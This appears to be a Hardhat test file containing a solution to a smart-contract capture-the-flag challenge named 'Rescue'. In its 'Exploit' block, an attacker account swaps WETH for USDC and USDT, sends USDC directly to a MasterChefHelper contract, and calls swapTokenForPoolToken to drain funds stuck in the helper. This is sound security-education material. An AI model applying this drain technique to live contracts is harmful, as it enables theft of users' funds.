import { ethers } from "hardhat";
import { expect } from "chai";

describe("[Challenge] Rescue", function () {
    let deployer, attacker;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        /**WARNING: These accounts, and their private keys, are publicly known. */
        let privateKey1 =
            "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d";
        let privateKey2 =
            "0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a";

        [deployer, attacker] = [
            new ethers.Wallet(privateKey1, ethers.provider),
            new ethers.Wallet(privateKey2, ethers.provider),
        ];

        const SetupFactory = await ethers.getContractFactory(
            "SetupRescue",
            deployer
        );

        this.challenge = await SetupFactory.deploy({
            value: ethers.utils.parseEther("10"),
        });

        expect(await this.challenge.isSolved()).to.equal(false);
    });

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */
        const usdcAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
        const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
        const wethAddress = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";

        const USDC = await ethers.getContractAt(
            "ERC20Like",
            usdcAddress,
            attacker
        );
        const USDT = await ethers.getContractAt(
            "ERC20Like",
            usdtAddress,
            attacker
        );
        const WETH = await ethers.getContractAt("WETH9", wethAddress, attacker);
        const router = await ethers.getContractAt(
            "UniswapV2RouterLike",
            "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F",
            attacker
        );

        const mcHelperAddress = await this.challenge.mcHelper();
        const mcHelper = await ethers.getContractAt(
            "MasterChefHelper",
            mcHelperAddress,
            attacker
        );
        // const mc = await ethers.getContractAt('MasterChefLike', "0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd", attacker);

        await WETH.deposit({ value: ethers.utils.parseEther("20") });
        await WETH.approve(router.address, ethers.utils.parseEther("20"));

        await router.swapExactTokensForTokens(
            ethers.utils.parseEther("1"),
            0,
            [wethAddress, usdtAddress],
            attacker.address,
            999999999999999
        );
        await router.swapExactTokensForTokens(
            ethers.utils.parseEther("15"),
            0,
            [wethAddress, usdcAddress],
            attacker.address,
            999999999999999
        );

        const usdcBalance = await USDC.balanceOf(attacker.address);
        await USDC.transfer(mcHelper.address, usdcBalance);

        const usdtBalance = await USDT.balanceOf(attacker.address);
        await USDT.approve(mcHelper.address, usdtBalance);

        const poolId = 1;
        await mcHelper.swapTokenForPoolToken(
            poolId,
            usdtAddress,
            usdtBalance,
            0
        );
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.challenge.isSolved()).to.equal(true);
    });
});
